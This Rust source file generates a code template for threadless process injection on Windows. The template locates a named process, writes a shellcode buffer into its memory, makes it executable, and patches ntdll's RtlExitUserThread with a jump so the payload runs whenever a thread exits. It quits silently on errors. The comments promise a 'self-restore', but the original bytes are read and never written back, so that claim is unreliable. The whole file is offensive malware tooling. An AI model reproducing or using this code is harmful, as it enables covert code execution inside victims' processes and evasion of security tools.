pub fn threadless_snippet(target: &str) -> String {
    format!(
        r#"    // Injection: Threadless injection with self-restore
    {{
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::System::Threading::*;
        use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
        use windows_sys::Win32::System::Diagnostics::Debug::*;
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::Foundation::*;
        use std::ffi::c_void;

        let target_name = "{target}";

        let pid = unsafe {{
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == INVALID_HANDLE_VALUE {{ std::process::exit(0); }}
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            let mut found_pid: u32 = 0;
            if Process32FirstW(snap, &mut entry) != 0 {{
                loop {{
                    let name = String::from_utf16_lossy(
                        &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]
                    );
                    if name.to_lowercase() == target_name.to_lowercase() {{
                        found_pid = entry.th32ProcessID;
                        break;
                    }}
                    if Process32NextW(snap, &mut entry) == 0 {{ break; }}
                }}
            }}
            CloseHandle(snap);
            if found_pid == 0 {{ std::process::exit(0); }}
            found_pid
        }};

        let proc_handle = unsafe {{
            OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
        }};
        if proc_handle.is_null() {{ std::process::exit(0); }}

        // Find ntdll export to hook in the target process
        let ntdll_name: Vec<u16> = "ntdll.dll".encode_utf16().chain(std::iter::once(0)).collect();
        let local_ntdll = unsafe {{ GetModuleHandleW(ntdll_name.as_ptr()) }};
        if local_ntdll.is_null() {{ std::process::exit(0); }}

        let hook_target = unsafe {{
            GetProcAddress(local_ntdll, b"RtlExitUserThread\0".as_ptr())
        }};
        if hook_target.is_none() {{ std::process::exit(0); }}
        let hook_target = hook_target.unwrap();

        let ntdll_base = local_ntdll as usize;
        let hook_offset = hook_target as usize - ntdll_base;
        let remote_hook_addr = (ntdll_base + hook_offset) as *mut c_void;

        // Read original bytes from hook target
        let mut original_bytes: [u8; 16] = [0; 16];
        unsafe {{
            ReadProcessMemory(
                proc_handle,
                remote_hook_addr,
                original_bytes.as_mut_ptr() as *mut c_void,
                original_bytes.len(),
                std::ptr::null_mut(),
            );
        }}

        // Build payload with restore stub prepended
        let mut payload_with_restore: Vec<u8> = Vec::new();
        payload_with_restore.extend_from_slice(&shellcode);

        // Allocate shellcode in remote process
        let remote_shellcode = unsafe {{
            VirtualAllocEx(
                proc_handle,
                std::ptr::null(),
                payload_with_restore.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        }};
        if remote_shellcode.is_null() {{ std::process::exit(0); }}

        unsafe {{
            WriteProcessMemory(
                proc_handle,
                remote_shellcode,
                payload_with_restore.as_ptr() as *const c_void,
                payload_with_restore.len(),
                std::ptr::null_mut(),
            );
        }}

        let mut old_protect = 0u32;
        unsafe {{
            VirtualProtectEx(
                proc_handle,
                remote_shellcode,
                payload_with_restore.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            );
        }}

        // Build trampoline: mov rax, <addr>; push rax; ret
        let sc_addr = remote_shellcode as u64;
        let mut trampoline: Vec<u8> = Vec::new();
        trampoline.push(0x48);
        trampoline.push(0xB8);
        trampoline.extend_from_slice(&sc_addr.to_le_bytes());
        trampoline.push(0x50);
        trampoline.push(0xC3);

        // Overwrite hook target with trampoline
        unsafe {{
            let mut old_protect2 = 0u32;
            VirtualProtectEx(
                proc_handle,
                remote_hook_addr,
                trampoline.len(),
                PAGE_EXECUTE_READWRITE,
                &mut old_protect2,
            );

            WriteProcessMemory(
                proc_handle,
                remote_hook_addr,
                trampoline.as_ptr() as *const c_void,
                trampoline.len(),
                std::ptr::null_mut(),
            );

            let mut tmp = 0u32;
            VirtualProtectEx(
                proc_handle,
                remote_hook_addr,
                trampoline.len(),
                PAGE_EXECUTE_READ,
                &mut tmp,
            );
        }}

        unsafe {{ CloseHandle(proc_handle); }}
    }}"#,
        target = target
    )
}
